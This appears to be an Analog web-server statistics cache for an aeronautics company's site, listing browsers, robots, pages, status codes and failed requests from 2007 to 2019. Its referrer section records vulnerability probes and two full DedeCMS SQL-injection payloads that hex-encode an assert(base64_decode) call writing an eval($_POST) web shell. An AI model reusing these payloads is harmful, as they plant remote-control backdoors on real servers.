B	Rb	5663	0.377	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36
B	Rb	5436	0.685	Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.2) Gecko/20040804 Netscape/7.2 (ax)
B	Rb	5306	0.293	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
B	Rb	5195	0.724	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
B	Rb	4845	0.270	Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
B	Rb	4620	0.188	Googlebot-Image/1.0
B	Rb	4446	0.400	Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)
B	Rb	4368	0.079	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
B	Rb	3605	0.336	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)
B	Rb	3493	0.406	Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php? )
B	Rb	3289	0.669	Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b
B	Rb	3279	0.533	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.2; .NET CLR 2.0.50727; .NET CLR)
B	Rb	3062	0.179	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322)
B	Rb	3049	0.092	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET CLR 1.1.4322)
B	Rb	2770	0.070	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
B	Rb	2733	0.644	Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)
B	Rb	2727	0.183	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0
B	Rb	2697	0.619	Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1736.0 Safari/537.36
B	Rb	2691	0.690	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1
B	Rb	2683	0.368	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
B	Rb	2639	0.574	PRurl
B	Rb	2631	0.263	Sogou web spider/4.0( http://www.sogou.com/docs/help/webmasters.htm#07)
B	Rb	2607	0.202	Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
B	Rb	2495	0.039	Mozilla/5.0 (compatible; YandexImages/3.0;  http://yandex.com/bots)
B	Rb	2489	0.010	msnbot/2.0b ( http://search.msn.com/msnbot.htm)
B	Rb	506263	69.192	[not listed: 16768]
b	*f	-15Q	s
b	lRQq	1	8	3949721448	299.357	AHC
b	lRQq	2	8	1974860725	149.678	AHC/2
b	lRQq	1	54	4198352919	318.201	Google
b	lRQq	2	4	3949721446	299.357	Google/1
b	lRQq	2	50	248631473	18.844	Google/2
b	lRQq	1	127	4198352919	318.201	AppEngine-Google; ( http:
b	lRQq	2	127	4198352919	318.201	AppEngine-Google; ( http://code
b	lRQq	1	45	3949721446	299.357	Riddler (http:
b	lRQq	2	45	3949721446	299.357	Riddler (http://riddler
b	lRQq	1	306	3949721446	299.357	Blackboard Safeassign
b	lRQq	2	66	1974860723	149.678	Blackboard Safeassign/0
b	lRQq	1	566	3949721446	299.357	Baiduspider ( http:
b	lRQq	2	566	3949721446	299.357	Baiduspider ( http://www
b	lRQq	1	306	3949721446	299.357	NextGenSearchBot
b	lRQq	2	6	1974860723	149.678	NextGenSearchBot/4
b	lRQq	2	300	1974860723	149.678	NextGenSearchBot/1
b	lRQq	1	15	3949721446	299.357	PagesInventory (robot http:
b	lRQq	2	15	3949721446	299.357	PagesInventory (robot http://www
b	lRQq	1	11	3949721446	299.357	BlackBerry9630
b	lRQq	2	11	3949721446	299.357	BlackBerry9630/5
b	lRQq	1	18	3949721446	299.357	Brodie
b	lRQq	2	18	3949721446	299.357	Brodie/1
b	lRQq	1	587	3949721446	299.357	Aboundex
b	lRQq	2	587	3949721446	299.357	Aboundex/0
b	lRQq	1	26	3949721446	299.357	CazoodleBot
b	lRQq	2	1	1974860723	149.678	CazoodleBot/0
b	lRQq	2	25	1974860723	149.678	CazoodleBot/CazoodleBot-0
b	lRQq	1	482	3949721446	299.357	BUbiNG ( http:
b	lRQq	2	482	3949721446	299.357	BUbiNG ( http://law
b	lRQq	1	31	3949721446	299.357	SolomonoBot
b	lRQq	2	31	3949721446	299.357	SolomonoBot/1
b	lRQq	1	631	3949721446	299.357	http:
b	lRQq	2	624	1974860723	149.678	http://www
b	lRQq	2	7	1974860723	149.678	http://domino
b	lRQq	1	749815	1705861152	129.290	[not listed: 706]
p	*f	0Q	s
p	lR	1	443693	Windows
p	lR	2	183038	Unknown Windows
p	lR	2	20221	Windows NT
p	lR	2	226828	Windows XP
p	lR	2	7963	Windows 2000
p	lR	2	1148	Windows ME
p	lR	2	299	Windows 3.1
p	lR	2	1706	Windows 95
p	lR	2	284	Windows CE
p	lR	2	2206	Windows 98
p	lR	1	165913	OS unknown
p	lR	1	57490	Macintosh
p	lR	2	53861	Unknown Macintosh
p	lR	2	523	Macintosh 68k
p	lR	2	3106	Macintosh PowerPC
p	lR	1	31643	Unix
p	lR	2	31232	Linux
p	lR	2	21	SunOS
p	lR	2	37	BSD
p	lR	2	350	Other Unix
p	lR	2	3	HP-UX
p	lR	1	54265	Known robots
p	lR	1	16	WebTV
p	lR	1	1	BeOS
p	lR	1	1	OS/2
p	lR	1	6	Amiga
i	*f	0R	s
i	lRc	1	427301	68.455	[root directory]
i	lRc	1	204915	31.119	/images/
i	lRc	1	83286	0.225	/js/
i	lRc	1	44410	0.202	/css/
i	lRc	1	865	0.000	/videos/
i	lRc	1	541	0.000	/client/
i	lRc	1	1	0.000	/cgi-bin/
i	lRc	1	155	0.000	/dev/
i	lRc	2	23	0.000	/dev/css/
i	lRc	2	44	0.000	/dev/js/
i	lRc	2	59	0.000	/dev/images/
i	lRc	1	60	0.000	/stats/
r	*FR	2007	12	18	17	11
r	*LR	2019	03	22	20	05
r	*f	0.050000%S	s
r	lRSc	1	23040	58	80.896	/indnews.html
r	lRSc	2	1	0	0.000	/indnews.html?referer=top1.co.pl
r	lRSc	2	1	0	0.000	/indnews.html?referer=www.clickfind.com.au//wp-content/themes/busybee/thumb.php?src=http://blogger.com.opontodaarte.com.br/java.php
r	lRSc	1	20246	39	1.031	/aboutus.html
r	lRSc	1	16932	34	9.199	/compnews.html
r	lRSc	1	3471	32	0.894	/sru.html
r	lRSc	1	9491	30	0.623	/employment.html
r	lRSc	1	12012	30	0.464	/contactus.html
r	lRSc	1	12158	27	0.889	/cct&m.html
r	lRSc	1	1068	26	0.714	/gt380+rpas.html
r	lRSc	1	8542	24	0.371	/pna.html
r	lRSc	1	12213	23	0.583	/cfmt.html
r	lRSc	1	1254	23	0.650	/gt1500+rpas.html
r	lRSc	1	10422	20	0.650	/indevents.html
r	lRSc	1	1043	16	0.460	/gt50t+rpas.html
r	lRSc	1	9573	16	0.544	/faq.html
r	lRSc	1	12876	14	0.586	/consultinga.html
r	lRSc	1	16886	14	0.523	/uasfc.html
r	lRSc	1	11656	13	0.426	/links.html
r	lRSc	1	8138	10	0.348	/rd.html
r	lRSc	1	3545	2	0.058	/banditomav.html
r	lRSc	1	3765	2	0.037	/uavengines.html
r	lRSc	1	3621	2	0.052	/gtatexan.html
r	lRSc	1	1	0	0.000	/client/bandito timeline2007.html
r	lRSc	1	2	0	0.000	/client/bandit+timeline2004.html
r	lRSc	1	1	0	0.000	/stats/quick.html
r	lRSc	1	1	0	0.000	/404.htm
r	lRSc	1	12	0	0.000	/client/gta010707002.html
r	lRSc	1	72	0	0.000	/client/bandito+development.html
r	lRSc	1	135	0	0.000	/client/welcome.html
r	lRSc	1	3	0	0.000	/client/gta021305001.html
r	lRSc	1	1	0	0.000	/stats/browserrep.html
r	lRSc	1	741	0	0.000	/gt50t rpas.html
r	lRSc	1	5	0	0.000	/client/gta012405001.html
r	lRSc	1	2	0	0.000	/dev/contactus.html
r	lRSc	1	3	0	0.000	/stats/general.html
r	lRSc	1	1	0	0.000	/dev/aboutus.html
r	lRSc	1	18	0	0.000	/client/tacamo+development.html
r	lRSc	1	1	0	0.000	/client/bandit development.html
r	lRSc	1	17	0	0.000	/client/bandit+timeline2008.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2005.html
r	lRSc	1	23	0	0.000	/client/projectbids.html
r	lRSc	1	1	0	0.000	/stats/host.html
r	lRSc	1	11	0	0.000	/client/rq2+outlaw.html
r	lRSc	1	1	0	0.000	/client/bandit timeline2008.html
r	lRSc	1	20	0	0.000	/client/clientpna.html
r	lRSc	1	15	0	0.000	/client/bandit.html
r	lRSc	1	2	0	0.000	/stats/default.asp
r	lRSc	1	21	0	0.000	/index.htm
r	lRSc	1	1	0	0.000	/cgi-bin/testms.pl
r	lRSc	1	964	0	0.000	/gtamt.html
r	lRSc	1	14	0	0.000	/client/rq1+bandit.html
r	lRSc	1	2253	0	0.000	/gt1500 rpas.html
r	lRSc	1	6	0	0.000	/client/gta021305002.html
r	lRSc	1	4	0	0.000	/client/gta121004001.html
r	lRSc	1	24	0	0.000	/client/tacamo.html
r	lRSc	1	30	0	0.000	/client/mgqgcyat.asp
r	lRSc	1	1	0	0.000	/dev/client.cgi
r	lRSc	1	18702	0	0.000	/default.asp
r	lRSc	1	1666	0	0.000	/gt380 rpas.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2006.html
r	lRSc	1	16	0	0.000	/client/rq3+bandito.html
r	lRSc	1	1	0	0.000	/dev/uasfc.html
r	lRSc	1	229	0	0.000	/client.cgi
r	lRSc	1	71	0	0.000	/client/bandit+development.html
r	lRSc	1	2	0	0.000	/client/bandito development.html
r	lRSc	1	2	0	0.000	/stats/yearly.html
r	lRSc	1	2	0	0.000	/stats/domain.html
r	lRSc	1	1	0	0.000	/stats/monthly.html
r	lRSc	1	1	0	0.000	/stats/weekly.html
r	lRSc	1	8	0	0.000	/client/gta010707001.html
r	lRSc	1	3749	0	0.000	/bidspridpass.html
r	lRSc	1	6356	0	0.000	/pridpass.html
r	lRSc	1	12	0	0.000	/client/bandito.html
r	lRSc	1	1	0	0.000	/dev/pna.html
r	lRSc	1	1	0	0.000	/client/tacamo development.html
r	lRSc	1	3	0	0.000	/stats/index.htm
r	lRSc	1	3	0	0.000	/stats/nav.html
r	lRSc	1	1	0	0.000	/stats/quarterly.html
r	lRSc	1	3542	0	0.000	/bandituas.html
r	lRSc	1	2	0	0.000	/stats/directory.html
r	lRSc	1	2	0	0.000	/stats/organisation.html
r	lRSc	1	8	0	0.000	/client/bandito+timeline2007.html
r	lRSc	1	7	0	0.000	/client/bandit+timeline2007.html
r	lRSc	1	1	0	0.000	/dev/pridpass.html
t	*f	0.100000%B	b
t	lRb	1	221760	44.857	.html [Hypertext Markup Language]
t	lRb	1	177758	22.158	[directories]
t	lRb	1	151714	19.591	.jpg  [JPEG graphics]
t	lRb	1	778	4.958	.wmv
t	lRb	1	87	4.868	.mpg  [MPEG movie]
t	lRb	1	18734	2.094	.asp  [Active Server REQUESTS]
t	lRb	1	53278	0.570	.gif  [GIF graphics]
t	lRb	1	83330	0.426	.js  [JavaScript code]
t	lRb	1	44427	0.381	.css  [Cascading Style Sheets]
t	lRb	1	9668	0.098	[not listed: 6]
z	*FR	2009	06	30	04	42
z	*LR	2019	03	22	23	26
z	ScR	164	0.000	52858	0
z	ScR	0	0.000	0	1b-  10b
z	ScR	0	0.000	0	11b- 100b
z	ScR	37	0.012	72147	101b-  1kb
z	ScR	596	4.403	361258	1kb- 10kb
z	ScR	502	35.741	241013	10kb-100kb
z	ScR	139	59.844	33965	100kb-  1Mb
z	ScR	0	0.000	250	1Mb- 10Mb
z	ScR	0	0.000	43	10Mb-100Mb
c	*FR	2014	03	02	13	52
c	*LR	2019	03	22	23	49
c	*f	0R	a
c	R	687241	200 OK
c	R	5400	206 Partial content
c	R	102	301 Document moved permanently
c	R	77	302 Document found elsewhere
c	R	68893	304 Not modified since last retrieval
c	R	260	400 Bad request
c	R	207	401 Authentication required
c	R	139	403 Access forbidden
c	R	334204	404 Document not found
c	R	510	405 Method not allowed
c	R	460	406 Document not acceptable to client
c	R	9	416 Requested range not valid
c	R	612	500 Internal server error
c	R	126	501 Request type not supported
I	*FR	2007	12	11	00	52
I	*LR	2019	03	22	23	49
I	*f	-30S	s
I	lRS	1	75320	173	/robots.txt
I	lRS	1	473	85	/ads.txt
I	lRS	1	4678	17	/wp-login.php
I	lRS	1	60	8	/user.php
I	lRS	1	128	7	/wp-includes/wlwmanifest.xml
I	lRS	1	907	6	/xmlrpc.php
I	lRS	1	25	6	/uploads/dede/sys_verifies.php
I	lRS	1	1356	5	/index.php
I	lRS	1	11	4	/wp1/wp-includes/wlwmanifest.xml
I	lRS	1	11	4	/shop/wp-includes/wlwmanifest.xml
I	lRS	1	1155	4	/plus/mytag_js.php
I	lRS	1	11	4	/2018/wp-includes/wlwmanifest.xml
I	lRS	1	11	4	/web/wp-includes/wlwmanifest.xml
I	lRS	1	11	4	/2017/wp-includes/wlwmanifest.xml
I	lRS	1	117	4	/plus/moon.php
I	lRS	1	21	4	/admin_aspcms/_system/aspcms_sitesetting.asp
I	lRS	1	11	4	/sito/wp-includes/wlwmanifest.xml
I	lRS	1	111	4	/blog/wp-includes/wlwmanifest.xml
I	lRS	1	11	4	/website/wp-includes/wlwmanifest.xml
I	lRS	1	11	4	/2016/wp-includes/wlwmanifest.xml
I	lRS	1	11	4	/news/wp-includes/wlwmanifest.xml
I	lRS	1	111	4	/wordpress/wp-includes/wlwmanifest.xml
I	lRS	1	111	4	/wp/wp-includes/wlwmanifest.xml
I	lRS	1	11	4	/2015/wp-includes/wlwmanifest.xml
I	lRS	1	11	4	/media/wp-includes/wlwmanifest.xml
I	lRS	1	109	4	/cms/wp-includes/wlwmanifest.xml
I	lRS	1	11	4	/wp2/wp-includes/wlwmanifest.xml
I	lRS	1	11	4	/test/wp-includes/wlwmanifest.xml
I	lRS	1	111	4	/site/wp-includes/wlwmanifest.xml
I	lRS	1	61	3	/utility/convert/index.php
I	lRS	1	251530	146	[not listed: 16162]
L	*FR	2007	12	11	00	52
L	*LR	2019	03	22	23	49
L	*f	-20S	s
L	RS	40	40	58.218.205.253
L	RS	34	34	61.132.225.45
L	RS	24	24	34.234.221.103
L	RS	21	21	47.94.223.32
L	RS	20	20	54.235.60.176
L	RS	27	20	46.118.157.179
L	RS	40	20	46.119.112.31
L	RS	34	20	194.113.106.125
L	RS	20	20	192.99.13.20
L	RS	18	18	54.172.48.240
L	RS	12	12	223.255.127.165
L	RS	508	10	216.244.66.229
L	RS	28	8	40.77.167.52
L	RS	7	7	54.37.130.105
L	RS	6	6	35.227.49.41
L	RS	6	6	35.227.103.43
L	RS	6	6	35.229.103.78
L	RS	13	6	66.249.64.56
L	RS	6	6	54.37.131.199
L	RS	55	5	77.75.76.164
L	RS	335602	231	[not listed: 64591]
K	*FR	2013	12	22	04	20
K	*LR	2019	03	22	23	17
K	*f	-30S	s
K	lRS	1	14	6	http://www.gtaeronautics.com/uploads/dede/sys_verifies.php
K	lRS	1	178	6	http://www.gtaeronautics.com/gtaTexan.html
K	lRS	1	258	4	http://gtaeronautics.com/wp-login.php
K	lRS	1	85	3	http://www.gtaeronautics.com/plus/mytag_js.php
K	lRS	1	11	3	http://www.gtaeronautics.com/plus/moon.php
K	lRS	1	3	3	554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:288:"*/+union+select+1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10--+-";s:2:"id";s:3:"'/*";}
K	lRS	1	9	3	http://www.gtaeronautics.com/utility/convert/index.php
K	lRS	1	9	3	http://www.gtaeronautics.com/admin_aspcms/_system/AspCms_SiteSetting.asp
K	lRS	1	3	3	http://www.gtaeronautics.com/fdgq.php
K	lRS	1	13	3	http://www.gtaeronautics.com/utility/convert/data/config.inc.php
K	lRS	1	3	3	http://www.gtaeronautics.com/ysyqq.php
K	lRS	1	3	3	45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:297:"*/SELECT+1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10--+-";s:2:"id";s:11:"-1'+UNION/*";}45ea207d7a2b68c49582d2d22adf953a
K	lRS	1	58	3	http://www.gtaeronautics.com//index.php
K	lRS	1	17	2	http://www.gtaeronautics.com//x.php
K	lRS	1	4	2	http://www.gtaeronautics.com/plus/recommend.php
K	lRS	1	8	1	http://www.gtaeronautics.com//wwwroot.rar
K	lRS	1	2	1	http://www.gtaeronautics.com/wp-content/themes/ThisWay/includes/uploadify/upload_settings_image.php
K	lRS	1	8	1	http://www.gtaeronautics.com//www.gtaeronautics.com/..rar
K	lRS	1	2	1	http://www.gtaeronautics.com//uploadfile/member/0/0x0.php
K	lRS	1	71	1	http://www.gtaeronautics.com/index.php
K	lRS	1	8	1	http://www.gtaeronautics.com//wwwroot.zip
K	lRS	1	6	1	http://www.gtaeronautics.com//NewsType.asp
K	lRS	1	8	1	http://www.gtaeronautics.com//www.gtaeronautics.com/..zip
K	lRS	1	1	1	http://www.gtaeronautics.com/wp-content/themes/famous/style.css
K	lRS	1	2	1	http://www.gtaeronautics.com//data/backupdata/dede_a~1.txt
K	lRS	1	8	1	http://www.gtaeronautics.com//admin_aspcms/_system/AspCms_SiteSetting.asp
K	lRS	1	2	1	http://www.gtaeronautics.com//robots.php
K	lRS	1	1	1	http://www.gtaeronautics.com//data/cache_template/rss.tpl.php
K	lRS	1	2	1	http://www.gtaeronautics.com//data/backupdata/dede_a~5.txt
K	lRS	1	1	1	http://www.gtaeronautics.com//function/editor/php/upload_json.php
K	lRS	1	33842	36	[not listed: 3314]
E	*FR	2008	01	06	10	12
E	*LR	2018	02	26	21	55
E	*f	-30S	s
E	lSR	1	0	179	[not listed: 6]
l	*FR	2008	01	06	10	12
l	*LR	2018	02	26	21	55
l	*f	-20S	s
l	SR	0	179	[not listed: 98]
v	*f	-20B	b
v	Rb	657415	80.210	66.113.131.59
v	Rb	104119	19.790	64.41.87.40
R	*FR	2008	01	06	10	12
R	*LR	2018	02	26	21	55
R	*f	-20R	r
R	R	178	66.113.131.59
R	R	1	64.41.87.40
M	*FR	2007	12	11	00	52
M	*LR	2019	03	22	23	49
M	*f	-20R	r
M	R	302606	66.113.131.59
M	R	33921	64.41.87.40
J	*FR	2007	12	11	00	53
J	*LR	2017	03	17	18	30
J	*f	-20R	r
J	R	9	gtaeronautics
J	R	5	lorrigkj
J	R	1	rullma2063
J	R	1	administrator
J	R	1	satish
J	R	1	nnnnn
P	*FR	2018	08	14	13	43
P	*LR	2019	03	22	23	26
P	R	7	0
P	R	0	<= 0.01
P	R	182	0.01-0.02
P	R	7539	0.02-0.05
P	R	15010	0.05-0.1 
P	R	26114	0.1 -0.2 
P	R	27392	0.2 -0.5 
P	R	14860	0.5 -1   
P	R	7734	1-  2 
P	R	3217	2-  5 
P	R	1319	5- 10 
P	R	409	10- 20 
P	R	267	20- 60 
P	R	48	60-120 
P	R	19	120-300 
